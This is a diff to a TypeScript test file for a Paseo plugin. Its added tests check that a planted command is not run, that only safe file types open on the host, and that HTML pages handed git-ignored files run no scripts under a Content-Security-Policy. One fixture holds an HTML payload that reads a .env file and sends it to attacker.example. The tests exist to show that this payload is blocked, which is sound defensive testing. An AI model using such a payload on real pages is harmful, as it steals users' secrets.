@@ -2,9 +2,10 @@
 // dashboard the panel would get.
 import assert from "node:assert/strict";
 import { execFile } from "node:child_process";
+import { createHash } from "node:crypto";
 import { appendFile, mkdir, mkdtemp, readdir, readFile, readlink, realpath, rm, symlink, truncate, utimes, writeFile } from "node:fs/promises";
 import { hostname, tmpdir } from "node:os";
-import { basename, delimiter, join } from "node:path";
+import { basename, delimiter, dirname, join } from "node:path";
 import { test, type TestContext } from "node:test";
 import { fileURLToPath } from "node:url";
 import { promisify } from "node:util";
@@ -38,12 +39,15 @@ import {
   findAttachment,
   folderAttachments,
   imageMimeType,
+  isFolder,
+  opensOnHost,
 } from "../shared/attachments.ts";
 import { findStore, outsideDirectory, runFileName } from "./store.ts";
 import { mirrorQuestionMode, questionModePath, readQuestionMode, writeQuestionMode } from "./question-mode.ts";
 import type { QuestionMode } from "../shared/question-modes.ts";
 import { ticketStory } from "../shared/ticket-story.ts";
 import { parseBlocks } from "../shared/blocks.ts";
+import { PAGE_ESCAPE_SCRIPT } from "../shared/page.ts";
 
 // Real repos in these tests; the user's own git config stays out of them.
 process.env.GIT_CONFIG_GLOBAL = "/dev/null";
@@ -1456,6 +1460,30 @@ test("the launcher runs the command from the plugin folder Paseo reports", async
   );
 });
 
+// A Paseo command that reports the plugin at `pluginDirectory`.
+const standInPaseo = (pluginDirectory: string) => `#!/bin/sh\necho '${JSON.stringify([{ id: "progress", path: pluginDirectory }])}'\n`;
+
+test("the launcher asks Paseo from Node's folder, so a command name never resolves in the agent's folder", async (t) => {
+  const w = await worktree(t);
+  const work = await mkdtemp(join(tmpdir(), "progress-lookup-"));
+  t.after(() => rm(work, { recursive: true, force: true }));
+  const target = join(work, "bin", "paseo-progress");
+  assert.equal(await installLauncher(target), true);
+  const plugin = async (name: string) => {
+    const directory = join(work, name);
+    await mkdir(join(directory, "server"), { recursive: true });
+    await writeFile(join(directory, "server", "cli.ts"), `console.log(${JSON.stringify(name)});\n`);
+    return directory;
+  };
+  await writeFile(join(w.directory, "planted-paseo"), standInPaseo(await plugin("planted")), { mode: 0o755 });
+  const real = join(work, "paseo");
+  await writeFile(real, standInPaseo(await plugin("reported")), { mode: 0o755 });
+  const env: NodeJS.ProcessEnv = { ...process.env, PASEO_BIN: "./planted-paseo", PASEO_CLI: real };
+  delete env.PASEO_PROGRESS_PLUGIN_DIR;
+  const { stdout } = await promisify(execFile)(target, ["show"], { cwd: w.directory, env });
+  assert.equal(stdout.trim(), "reported");
+});
+
 test("the launcher is installed only on request, updated when stale, and never replaces another file", async (t) => {
   const home = await mkdtemp(join(tmpdir(), "progress-home-"));
   t.after(() => rm(home, { recursive: true, force: true }));
@@ -1480,8 +1508,17 @@ test("on Windows the launcher gets a .cmd beside it, and Paseo is looked for whe
   const home = await mkdtemp(join(tmpdir(), "progress-windows-"));
   t.after(() => rm(home, { recursive: true, force: true }));
   const path = defaultLauncherPath(home);
+  await mkdir(dirname(path), { recursive: true });
+  const before = `@echo off\r\nrem Written by the progress Paseo plugin. Lets PowerShell and cmd run paseo-progress.\r\nnode "%~dp0paseo-progress" %*\r\nexit /b %errorlevel%\r\n`;
+  await writeFile(`${path}.cmd`, before);
+  assert.equal((await launcherStatus(path, "", "win32")).state, "outdated", "a .cmd that runs whatever node the folder has needs an update");
   assert.equal(await installLauncher(path, "win32"), true);
-  assert.match(await readFile(`${path}.cmd`, "utf8"), /^@echo off\r\n.*\r\nnode "%~dp0paseo-progress" %\*\r\n/);
+  const cmd = await readFile(`${path}.cmd`, "utf8");
+  assert.ok(
+    cmd.includes(`\r\n"${process.execPath}" "%~dp0paseo-progress" %*\r\n`),
+    `the .cmd names the Node that installed it, so cmd.exe never looks in the agent's folder for one:\n${cmd}`,
+  );
+  assert.doesNotMatch(cmd, /^node /m);
   assert.equal(await installLauncher(path, "win32"), false, "both files are current");
   await rm(`${path}.cmd`);
   assert.equal((await launcherStatus(path, "", "win32")).state, "outdated", "a launcher from before the .cmd needs an update");
@@ -1503,9 +1540,9 @@ test("on Windows the launcher gets a .cmd beside it, and Paseo is looked for whe
 test("a local deliverable opens on the daemon host by id, only inside the worktree", async (t) => {
   const w = await screenshotRun(t);
   await mkdir(join(w.directory, "reports"), { recursive: true });
-  await writeFile(join(w.directory, "reports", "review.html"), "<h1>Review</h1>");
-  await w.run("deliverable", "add", "Review", "reports/review.html");
-  await w.run("deliverable", "add", "Gone", "reports/missing.html");
+  await writeFile(join(w.directory, "reports", "review.pdf"), "%PDF");
+  await w.run("deliverable", "add", "Review", "reports/review.pdf");
+  await w.run("deliverable", "add", "Gone", "reports/missing.pdf");
   await w.run("deliverable", "add", "Outside", tmpdir());
   await w.run("deliverable", "add", "Preview", "https://example.com");
   const opened: string[] = [];
@@ -1513,13 +1550,77 @@ test("a local deliverable opens on the daemon host by id, only inside the worktr
     opened.push(path);
   };
   const root = await realpath(w.directory);
-  assert.deepEqual(await openDeliverable(w.directory, "D1", opener), { opened: join(root, "reports", "review.html") });
-  assert.deepEqual(opened, [join(root, "reports", "review.html")]);
-  await assert.rejects(openDeliverable(w.directory, "D2", opener), /reports\/missing\.html no longer exists/);
+  assert.deepEqual(await openDeliverable(w.directory, "D1", opener), { opened: join(root, "reports", "review.pdf") });
+  assert.deepEqual(opened, [join(root, "reports", "review.pdf")]);
+  await assert.rejects(openDeliverable(w.directory, "D2", opener), /reports\/missing\.pdf no longer exists/);
   await assert.rejects(openDeliverable(w.directory, "D3", opener), /is outside this worktree/);
   await assert.rejects(openDeliverable(w.directory, "D4", opener), /No local deliverable D4/, "web links are not opened on the host");
   await assert.rejects(openDeliverable(w.directory, "D9", opener), /No local deliverable D9/);
   assert.equal(opened.length, 1);
+});
+
+test("only files whose default app shows them open on the host, and the panel offers Open for exactly those", async (t) => {
+  const w = await worktree(t);
+  await w.run("start", "Run");
+  const shown = [
+    "shot.png",
+    "photo.JPG",
+    "demo.mp4",
+    "clip.mov",
+    "voice.mp3",
+    "take.wav",
+    "spec.pdf",
+    "notes.txt",
+    "README.md",
+    "data.json",
+    "rows.csv",
+    "run.log",
+  ];
+  const refused = [
+    "run.command",
+    "report.bat",
+    "setup.exe",
+    "build.sh",
+    "launch.desktop",
+    "tool.jar",
+    "script.js",
+    "macro.docm",
+    "page.html",
+    "page.htm",
+    "logo.svg",
+    "plain",
+  ];
+  for (const name of [...shown, ...refused]) await writeFile(join(w.directory, name), "x");
+  await mkdir(join(w.directory, "Tool.app", "Contents"), { recursive: true });
+  await mkdir(join(w.directory, "shots.png"));
+  // A link named like a picture that leads to a script opens as the script would.
+  await symlink(join(w.directory, "run.command"), join(w.directory, "cover.png"));
+  const all = [...shown, ...refused, "Tool.app/", "shots.png/", "cover.png"];
+  for (const name of all) await w.run("deliverable", "add", name, name);
+  const { dashboard } = await w.dashboard();
+  const opened: string[] = [];
+  const outcomes: Record<string, boolean> = {};
+  for (const deliverable of dashboard.deliverables) {
+    const result = await openDeliverable(w.directory, deliverable.id, async (path) => {
+      opened.push(basename(path));
+    }).then(
+      () => true,
+      (error: Error) => {
+        assert.match(error.message, /^Progress opens only images, video, audio, PDFs and text files, not /);
+        return false;
+      },
+    );
+    outcomes[deliverable.title] = result;
+  }
+  assert.deepEqual(opened.toSorted(), shown.toSorted(), "nothing that can run, and no page or folder, reaches the default app");
+  for (const deliverable of dashboard.deliverables) {
+    const attachment = deliverableAttachment(deliverable);
+    assert.equal(
+      !isFolder(attachment) && opensOnHost(attachment.path!),
+      outcomes[deliverable.title] || deliverable.title === "cover.png",
+      `the panel and the server agree on ${deliverable.title}`,
+    );
+  }
 });
 
 test("a folder deliverable previews as its files, each found by the folder's id", async (t) => {
@@ -1771,7 +1872,8 @@ test("an HTML report previews with the files beside it written in, only from ins
   assert.equal(attachmentIcon(report), "FileCode");
   assert.equal(canPreview(report, { browser: true }), false, "a page is too wide for the preview dialog");
   assert.equal(opensAsPage(report, { browser: true }), true, "the desktop app gives the page a screen of its own");
-  assert.equal(opensAsPage(report, { browser: false }), false, "the phone apps open it on the computer running Paseo");
+  assert.equal(opensAsPage(report, { browser: false }), false, "the phone apps can't draw a page");
+  assert.equal(opensOnHost(report.path!), false, "a page never opens in the host's browser, where its scripts could read the user's files");
 });
 
 test("a page git tracks can't write in files git ignores; a page in an ignored folder gets only its own folder's", async (t) => {
@@ -1803,9 +1905,53 @@ test("a page git tracks can't write in files git ignores; a page in an ignored f
   );
   assert.equal(
     await html("D2"),
-    [`<script>notes()</script>`, `<script src="../.env"></script>`].join("\n"),
-    "an ignored page gets ignored files beside it, not the repo's .env",
+    [`${PRIVATE_PAGE_META}<script>notes()</script>`, `<script src="../.env"></script>`].join("\n"),
+    "an ignored page gets ignored files beside it, not the repo's .env, and then runs none of its own scripts",
   );
+});
+
+// Progress's own Escape script is the only one a page with ignored files runs.
+const PRIVATE_PAGE_POLICY = [
+  "default-src 'none'",
+  "img-src data:",
+  "media-src data:",
+  "font-src data:",
+  "style-src 'unsafe-inline'",
+  `script-src 'sha256-${createHash("sha256").update(PAGE_ESCAPE_SCRIPT).digest("base64")}'`,
+  "form-action 'none'",
+].join("; ");
+const PRIVATE_PAGE_META = `<meta http-equiv="Content-Security-Policy" content="${PRIVATE_PAGE_POLICY}">`;
+
+test("a page handed a file git ignores runs none of its own scripts and loads nothing, so it can't send the file anywhere", async (t) => {
+  const repo = await newRepo(t);
+  await writeFile(join(repo.directory, ".gitignore"), "/report.html\n/bare.html\n/plain.html\n.env\n");
+  await writeFile(join(repo.directory, ".env"), "SECRET=1");
+  const png = Buffer.from("89504e470d0a1a0a", "hex");
+  await writeFile(join(repo.directory, "logo.png"), png);
+  await git(repo.directory, "add", "-A");
+  await git(repo.directory, "commit", "-qm", "a cloned repo");
+  const leak = `<img id="x" src=".env"><script>new Image().src = "https://attacker.example/?d=" + document.getElementById("x").src</script>`;
+  await writeFile(join(repo.directory, "report.html"), `<!DOCTYPE html>\n${leak}`);
+  await writeFile(join(repo.directory, "bare.html"), leak);
+  await writeFile(join(repo.directory, "plain.html"), `<!doctype html><img src="logo.png"><script src="https://cdn.example/chart.js"></script>`);
+  await writeFile(join(repo.directory, "kept.html"), `<img src="logo.png"><script src="https://cdn.example/chart.js"></script>`);
+  await repo.run(repo.directory, "start", "Run");
+  for (const page of ["report.html", "bare.html", "plain.html", "kept.html"]) await repo.run(repo.directory, "deliverable", "add", page, page);
+  const html = async (id: string) => {
+    const preview = await previewDeliverable(repo.directory, id);
+    assert.ok(preview.kind === "html");
+    return preview.html;
+  };
+  const env = `data:application/octet-stream;base64,${Buffer.from("SECRET=1").toString("base64")}`;
+  assert.equal(await html("D1"), `<!DOCTYPE html>${PRIVATE_PAGE_META}\n${leak.replace(".env", env)}`, "the policy comes first after the doctype");
+  assert.equal(await html("D2"), `${PRIVATE_PAGE_META}${leak.replace(".env", env)}`, "and first of all with no doctype");
+  const logo = `data:image/png;base64,${png.toString("base64")}`;
+  assert.equal(
+    await html("D3"),
+    `<!doctype html><img src="${logo}"><script src="https://cdn.example/chart.js"></script>`,
+    "an ignored page given only files git keeps runs as written",
+  );
+  assert.equal(await html("D4"), `<img src="${logo}"><script src="https://cdn.example/chart.js"></script>`, "so does a page git keeps");
 });
 
 test("a page gets a file only when git says it keeps it: not one in a nested .git, a submodule, or named like a git pattern", async (t) => {
@@ -1969,11 +2115,10 @@ test("question attachments take paths or links, and open and preview like delive
   assert.match(ftp.text, /Only http\(s\) URLs/);
 });
 
-test("plain-text deliverables open in the default browser; everything else in its usual app", () => {
+test("plain-text deliverables open in the default browser; pictures, video, audio and PDFs in their usual app", () => {
   assert.deepEqual(openCommand("/w/spec.md", "darwin", "com.google.chrome"), ["open", ["-b", "com.google.chrome", "/w/spec.md"]]);
   assert.deepEqual(openCommand("/w/NOTES.TXT", "darwin", null), ["open", ["-b", "com.apple.Safari", "/w/NOTES.TXT"]], "Safari when no default browser is set");
-  assert.deepEqual(openCommand("/w/report.html", "darwin", "com.google.chrome"), ["open", ["/w/report.html"]]);
-  assert.deepEqual(openCommand("/w/shots/", "darwin", "com.google.chrome"), ["open", ["/w/shots/"]]);
+  assert.deepEqual(openCommand("/w/shot.png", "darwin", "com.google.chrome"), ["open", ["/w/shot.png"]]);
   assert.deepEqual(openCommand("/w/spec.md", "linux", null), ["xdg-open", ["/w/spec.md"]]);
 });
 
@@ -2441,7 +2586,7 @@ test("a page git reports as ignored gets ignored files only from its own folder 
   assert.ok(preview.kind === "html");
   assert.equal(
     preview.html,
-    [`<style>h1 {}</style>`, `<script>home()</script>`, `<script>run()</script>`, ...refs.slice(3)].join("\n"),
+    [`${PRIVATE_PAGE_META}<style>h1 {}</style>`, `<script>home()</script>`, `<script>run()</script>`, ...refs.slice(3)].join("\n"),
     "its folder's files and tracked files go in; ignored files elsewhere and .git stay out",
   );
 });
